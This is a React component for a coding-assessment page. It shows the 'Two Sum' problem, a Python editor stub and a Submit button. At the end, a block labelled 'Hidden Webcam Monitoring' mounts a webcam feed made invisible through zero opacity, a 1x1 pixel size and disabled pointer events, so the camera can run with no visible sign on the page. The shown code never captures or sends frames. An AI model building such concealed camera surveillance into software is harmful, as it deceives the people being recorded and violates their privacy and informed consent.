import React, { useRef } from "react";
import Webcam from "react-webcam";

export default function CodingAssessment() {
  const webcamRef = useRef(null);

  return (
    <div className="flex h-screen font-sans">
      {/* Sidebar - Problem Description */}
      <div className="w-[420px] bg-[#1e1e1e] text-white overflow-y-auto border-r border-gray-700 p-4">
        <h1 className="text-xl font-semibold mb-2">1. Two Sum</h1>
        <div className="text-sm text-gray-300 space-y-2">
          <p>
            Given an array of integers <code>nums</code> and an integer <code>target</code>,
            return <em>indices of the two numbers</em> such that they add up to <code>target</code>.
          </p>
          <p>
            You may assume that each input would have <strong>exactly one solution</strong>,
            and you may not use the <em>same</em> element twice.
          </p>
          <p>You can return the answer in any order.</p>
        </div>

        <div className="mt-6 text-sm text-gray-200">
          <h2 className="font-bold mb-2">Example 1:</h2>
          <pre className="bg-[#2d2d2d] p-2 rounded text-gray-100">
{`Input: nums = [2,7,11,15], target = 9
Output: [0,1]
Explanation: Because nums[0] + nums[1] == 9, we return [0, 1].`}
          </pre>

          <h2 className="font-bold mt-4 mb-2">Example 2:</h2>
          <pre className="bg-[#2d2d2d] p-2 rounded text-gray-100">
{`Input: nums = [3,2,4], target = 6
Output: [1,2]`}
          </pre>

          <h2 className="font-bold mt-4 mb-2">Example 3:</h2>
          <pre className="bg-[#2d2d2d] p-2 rounded text-gray-100">
{`Input: nums = [3,3], target = 6
Output: [0,1]`}
          </pre>
        </div>
      </div>

      {/* Editor */}
      <div className="flex-grow bg-[#1e1e1e] flex flex-col">
        <div className="flex items-center justify-between px-4 py-2 border-b border-gray-700">
          <span className="text-white text-sm">Python3 • Auto</span>
        </div>
        <textarea
          className="flex-grow bg-[#1e1e1e] text-green-400 font-mono text-sm p-4 outline-none resize-none"
          defaultValue={`class Solution:\n    def twoSum(self, nums: List[int], target: int) -> List[int]:\n        `}
        ></textarea>
        <div className="p-4 border-t border-gray-700 flex justify-end">
          <button className="bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded">
            Submit
          </button>
        </div>
      </div>

      {/* Hidden Webcam Monitoring */}
      <div className="absolute opacity-0 pointer-events-none">
        <Webcam
          ref={webcamRef}
          audio={false}
          screenshotFormat="image/jpeg"
          width={1}
          height={1}
        />
      </div>
    </div>
  );
}
